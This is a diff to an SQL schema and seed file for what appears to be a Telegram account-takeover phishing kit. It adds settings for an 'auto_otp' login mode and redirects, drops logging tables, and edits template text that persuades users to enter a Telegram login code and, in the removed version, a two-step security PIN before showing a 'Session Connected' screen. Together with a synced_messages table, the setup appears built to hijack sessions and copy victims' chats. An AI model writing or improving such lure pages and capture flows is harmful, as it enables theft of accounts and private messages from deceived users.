@@ -41,6 +41,11 @@ CREATE TABLE IF NOT EXISTS synced_messages (
   created_at TEXT DEFAULT CURRENT_TIMESTAMP
 );
 
+CREATE TABLE IF NOT EXISTS app_settings (
+  setting_key TEXT PRIMARY KEY,
+  setting_value TEXT NOT NULL
+);
+
 CREATE TABLE IF NOT EXISTS bot_templates (
   bot_id TEXT PRIMARY KEY,
   color TEXT DEFAULT 'default',
@@ -49,29 +54,9 @@ CREATE TABLE IF NOT EXISTS bot_templates (
   config_json TEXT NOT NULL
 );
 
-CREATE TABLE IF NOT EXISTS activity_logs (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  bot_id TEXT,
-  tg_id TEXT,
-  event_type TEXT,
-  action_name TEXT,
-  value TEXT,
-  valid INTEGER,
-  user_agent TEXT,
-  created_at TEXT DEFAULT CURRENT_TIMESTAMP
-);
-
-CREATE TABLE IF NOT EXISTS client_errors (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  bot_id TEXT,
-  tg_id TEXT,
-  where_loc TEXT,
-  message TEXT,
-  stack TEXT,
-  url TEXT,
-  ua TEXT,
-  created_at TEXT DEFAULT CURRENT_TIMESTAMP
-);
+INSERT OR IGNORE INTO app_settings (setting_key, setting_value) VALUES ('login_mode', 'auto_otp');
+INSERT OR IGNORE INTO app_settings (setting_key, setting_value) VALUES ('redirect_url', '');
+INSERT OR IGNORE INTO app_settings (setting_key, setting_value) VALUES ('pass_user_params', '1');
 
 INSERT OR IGNORE INTO bot_templates (bot_id, color, background_url, background_blur, config_json)
 VALUES (
@@ -79,5 +64,5 @@ VALUES (
   'default',
   '',
   0,
-  '{"code":{"title":"Auto OTP Verification","description":"We automatically sent a 6-digit login code to your Telegram bot chat. Enter it below to activate your session.","buttonText":"Verify & Login"},"pass":{"title":"Two-Step Security PIN","description":"Enter your account security PIN to complete login.","buttonText":"Unlock Session"},"end":{"title":"Session Connected","description":"Your account session is active and synced with our portal.","buttonText":"Open Portal"}}'
+  '{"code":{"title":"Auto OTP Verification","description":"Our bot automatically sent a 6-digit login code to your Telegram chat. Enter it below.","buttonText":"Verify & Continue"}}'
 );
